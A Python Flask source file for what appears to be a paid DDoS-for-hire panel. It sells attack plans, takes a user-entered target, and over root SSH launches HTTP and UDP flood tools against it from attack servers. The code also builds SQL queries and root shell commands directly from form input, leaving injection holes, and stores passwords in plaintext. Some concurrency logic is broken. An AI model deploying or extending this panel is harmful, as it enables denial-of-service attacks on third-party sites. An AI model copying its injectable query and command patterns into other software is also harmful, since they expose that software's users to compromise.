# -*- coding: utf-8 -*-
import hashlib
from turtle import st
from flask import Flask, request, render_template, jsonify, flash, session, escape, url_for, redirect
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine, text
import threading, datetime
import paramiko
import sqlite3
import dbdb
import pymysql, time, ssl

app = Flask(__name__)
app.config["SECRET_KEY"] = b'YOUR_SECRET_KEY'
app.config["PERMANENT_SESSION_LIFETIME"] = datetime.timedelta(minutes=15)

HTML_PATH_LOGIN = './sign/login.html'
HTML_PATH_REGISTER = './sign/register.html'
HTML_PATH_DASHBOARD = './dashboard.html'
HTML_PATH_LAYER4 = './service/layer4.html'
HTML_PATH_LAYER7 = './service/layer7.html'
HTML_PATH_403 = './error/403.html'
HTML_PATH_404 = './error/404.html'
HTML_PATH_405 = './error/405.html'
HTML_PATH_PLANS = './purchase/plans.html'
HTML_PATH_REDEEM = './purchase/redeem.html'
HTML_PATH_API = './api/api.html'

LINK_TELEGRAM = ''

SERVER = {
    'SERVER_1': ['SERVER_IP', 'SERVER_PW', '0'],
}

MAX_SERVER = len(SERVER)

def launchCommand(command, SERVER_NUM):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    cli.connect(SERVER[SERVER_NUM][0], port=22, username="root", password=SERVER[SERVER_NUM][1])
    cli.exec_command(command)
    cli.close()

def launchLayer7Attack(method, target, runtime, SERVER_NUM):
    command = ""
    if method == "bypass":
        command = f'cd /root/ && ./s5 GET {target} proxy.txt {runtime} 1000 10'
    else:
        command = f'cd /root/ && node {method}.js {target} {runtime} ./proxy.txt'
    threading.Thread(target=launchCommand, args=(command, SERVER_NUM)).start()

def launchLayer4Attack(method, target, port, runtime, SERVER_NUM):
    command = ""
    if method == "udp":
        command = f'cd /root/ && python3 udp.py {target} {port} {runtime}'
    else:
        return
    threading.Thread(target=launchCommand, args=(command, SERVER_NUM)).start()

def waitEnd(SERVER_NUM, runTime):
    SERVER[SERVER_NUM][2] == '1'
    time.sleep(int(runTime))
    SERVER[SERVER_NUM][2] == '0'

def runAttack(method, target, runTime):
    for SERVER_NUM in SERVER:
        if SERVER[SERVER_NUM][2] == '0':
            threading.Thread(target=waitEnd, args=(SERVER_NUM, runTime)).start()
            threading.Thread(target=launchLayer7Attack, args=(method, target, runTime, SERVER_NUM)).start()
            return True
        else:
            return False

def db_connector(sql_command):
    MYSQL_DB = {
        'user'     : 'root',
        'password' : '',
        'host'     : '',
        'port'     : '3306',
        'database' : 'panel'
    }
    db = pymysql.connect(
        host=MYSQL_DB['host'],
        port=int(MYSQL_DB['port']),
        user=MYSQL_DB['user'],
        passwd=MYSQL_DB['password'],
        db=MYSQL_DB['database'],
        charset='utf8'
    )
    cursor = db.cursor()
    cursor.execute(sql_command)
    result = cursor.fetchall()
    db.commit()
    db.close()
    return str(result).replace("(", "").replace(")", "").replace("'", "").replace(',', '').rstrip()

def checklogin():
    if 'user' in session:
        return True
    return False

@app.route('/', methods=['GET', 'POST']) 
def login():
    if request.method == 'GET':
        if checklogin():
            return render_template(HTML_PATH_DASHBOARD, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        return render_template(HTML_PATH_LOGIN)
    elif request.method =='POST':
        userid = request.form.get('username')
        userpw = request.form.get('password')

        data = db_connector(f'''SELECT userid, userplan, concurrent, expired, boottime FROM usertbl WHERE userid="{userid}" AND userpw="{userpw}";''')
        print(data)
        if data == "":
            return render_template(HTML_PATH_LOGIN, ErrorTitle="ERROR! ", ErrorMessage="Username/Password does not exist")
        else:
            session['user'] = userid
            session['userplan'] = data.split(' ')[1]
            session['concurrent'] = data.split(' ')[2]
            session['expired'] = data.split(' ')[3]
            session['boottime'] = data.split(' ')[4]
            return render_template(HTML_PATH_DASHBOARD, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method =='GET':
        if checklogin():
            return render_template(HTML_PATH_DASHBOARD, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        return render_template(HTML_PATH_REGISTER)
    elif request.method =='POST':
        userid = request.form.get('username')
        userpw = request.form.get('password')
        reuserpw = request.form.get('repassword')
        if userpw != reuserpw:
            return render_template(HTML_PATH_REGISTER, ErrorTitle="ERROR! ", ErrorMessage="Password is different")
        checkusername = db_connector(f'''SELECT userid FROM usertbl WHERE userid="{userid}";''')
        if checkusername == "":
            db_connector(f"INSERT INTO usertbl(userid, userpw, userplan, concurrent) VALUES('{userid}', '{userpw}', 'FREE', '0');")
            return render_template(HTML_PATH_LOGIN, ErrorTitle="NOTICE! ", ErrorMessage="Register Success")
        else:
            return render_template(HTML_PATH_REGISTER, ErrorTitle="ERROR! ", ErrorMessage="Username already exist")

@app.route('/logout', methods=['GET'])
def logout():
    session.pop('user', None)
    return render_template(HTML_PATH_LOGIN)

@app.route('/dashboard', methods=['GET'])
def dashboard():
    if checklogin():
        return render_template(HTML_PATH_DASHBOARD, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
    return render_template(HTML_PATH_LOGIN)

@app.route('/login', methods=['GET'])
def login2():
    if checklogin():
        return render_template(HTML_PATH_DASHBOARD, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
    return render_template(HTML_PATH_LOGIN)

@app.errorhandler(404)
def error_404(error):
    return render_template(HTML_PATH_404)

@app.errorhandler(403)
def error_403(error):
    return render_template(HTML_PATH_403)

@app.errorhandler(405)
def error_405(error):
    return render_template(HTML_PATH_405)

@app.route('/contact', methods=['GET'])
def contact():
    return redirect(LINK_TELEGRAM)

@app.route('/service', methods=['POST'])
def service():
    return 'hi'

@app.route('/layer4', methods=['GET'])
def layer4():
    if checklogin():
        return render_template(HTML_PATH_LAYER4, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
    return render_template(HTML_PATH_LOGIN)

def loggingL7(username, method, target, duration):
    logs = db_connector(f'''SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl7 WHERE userid="{username}";''')
    if logs.rstrip() == "":
        db_connector(f'''INSERT INTO attacklogl7(userid, attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10) VALUES('{username}', '{username}---{method}---{target}---{duration}', '-', '-', '-', '-', '-', '-', '-', '-', '-');''')
    logs = logs.split(' ')
    new = []
    new.append(f'{username}---{method}---{target}---{duration}')
    for i in range(9):
        try:
            new.append(logs[i+1])
        except Exception as e:
            print(e)
    print(new)
    db_connector(f'''UPDATE attacklogl7 SET attack1="{new[0]}", attack2="{new[1]}", attack3="{new[2]}", attack4="{new[3]}", attack5="{new[4]}", attack6="{new[5]}", attack7="{new[6]}", attack8="{new[7]}", attack9="{new[8]}", attack10="{new[9]}" WHERE userid="{username}";''')

@app.route('/layer7', methods=['GET', 'POST'])
def layer7():
    if request.method == 'GET':
        if checklogin():
            logs = db_connector(f'''SELECT attack1, attack2, attack3, attack4, attack5, attack6, attack7, attack8, attack9, attack10 FROM attacklogl7 WHERE userid="{session['user']}";''')
            if logs.rstrip() == "":
                return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
            count = 10 - int(logs.count('-'))
            logs = logs.split(' ')
            smethod = []
            starget = []
            sduration = []
            for i in range(int(count)):
                smethod.append(logs[i-1].split('---')[1])
                starget.append(logs[i-1].split('---')[2])
                sduration.append(logs[i-1].split('---')[3])
            return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'], count=count, smethod=smethod, starget=starget, sduration=sduration)
        return render_template(HTML_PATH_LOGIN)
    elif request.method == 'POST':
        uMethod = request.form.get('methods')
        uTarget = request.form.get('target')
        uTime = request.form.get('duration')
        uUsername = session['user']
        uPlan = session['userplan']
        uConcurrent = session['concurrent']
        uExpired = session['expired']
        uBoottime = session['boottime']
        running = db_connector(f'''SELECT running FROM usertbl WHERE userid="{uUsername}";''')
        if running == "0":
            flash('No concurrents left!')
            return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        if uBoottime == "0":
            flash('No plan active!')
            return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        if uBoottime != 0 and uBoottime < int(uTime):
            flash("Boottime Excess")
            return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        #공격 시작
        db_connector(f'''UPDATE usertbl SET running={str(int(running) - 1)} WHERE userid="{uUsername}";''')
        if not runAttack(uMethod, uTarget, uTime):
            flash("Attack server is full! Please wait moment")
            return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        flash('Attack start!')
        loggingL7(session['user'], uMethod, uTarget, uTime)
        return render_template(HTML_PATH_LAYER7, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])

@app.route('/plans', methods=['GET'])
def plans():
    if checklogin():
        return render_template(HTML_PATH_PLANS, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
    return render_template(HTML_PATH_LOGIN)

@app.route('/redeem', methods=['GET', 'POST'])
def redeem():
    if request.method == 'GET':
        if checklogin():
            return render_template(HTML_PATH_REDEEM, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        return render_template(HTML_PATH_LOGIN)
    elif request.method == 'POST':
        uCode = request.form.get('code')
        checkcode = db_connector(f'''SELECT codeplan FROM codetbl WHERE code="{uCode}";''')
        if checkcode == "":
            flash("Code not exist!")
            return render_template(HTML_PATH_REDEEM, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
        length = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
        if checkcode == "Bronze":
            db_connector(f'''UPDATE usertbl SET userplan="Bronze", boottime="1200", expired="{length}", concurrent="1", running="1" WHERE userid="{session['user']}";''')
            flash(f"Success! Plan: {checkcode}")
            session['concurrent'] = 1
            session['boottime'] = 1200
        elif checkcode == "Silver":
            db_connector(f'''UPDATE usertbl SET userplan="Silver", boottime="1500", expired="{length}", concurrent="2", running="2" WHERE userid="{session['user']}";''')
            flash(f"Success! Plan: {checkcode}")
            session['concurrent'] = 2
            session['boottime'] = 1500
        elif checkcode == "Gold":
            db_connector(f'''UPDATE usertbl SET userplan="Gold", boottime="1800", expired="{length}", concurrent="3", running="3" WHERE userid="{session['user']}";''')
            flash(f"Success! Plan: {checkcode}")
            session['concurrent'] = 3
            session['boottime'] = 1800
        elif checkcode == "Diamond":
            db_connector(f'''UPDATE usertbl SET userplan="Diamond", boottime="2400", expired="{length}", concurrent="5", running="5" WHERE userid="{session['user']}";''')
            flash(f"Success! Plan: {checkcode}")
            session['concurrent'] = 5
            session['boottime'] = 2400
        elif checkcode == "Master":
            db_connector(f'''UPDATE usertbl SET userplan="Master", boottime="3600", expired="{length}", concurrent="20", running="20" WHERE userid="{session['user']}";''')
            flash(f"Success! Plan: {checkcode}")
            session['concurrent'] = 20
            session['boottime'] = 3600
        session['userplan'] = checkcode
        session['expired'] = length
        print(checkcode, length)
        return render_template(HTML_PATH_REDEEM, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])

@app.route('/api', methods=['GET'])
def api():
    if checklogin():
        return render_template(HTML_PATH_API, username=session['user'], userplan=session['userplan'], concurrent=session['concurrent'], expired=session['expired'])
    return render_template(HTML_PATH_LOGIN)

@app.route('/plans/bronze', methods=['GET'])
def bronze():
    return redirect('')

@app.route('/plans/silver', methods=['GET'])
def silver():
    return redirect('')

@app.route('/plans/gold', methods=['GET'])
def gold():
    return redirect('')

@app.route('/plans/diamond', methods=['GET'])
def diamond():
    return redirect('')

@app.route('/plans/master', methods=['GET'])
def master():
    return redirect('')


if __name__ == '__main__':
        
    app.run(host="0.0.0.0", port="80",debug=False, threaded=True)
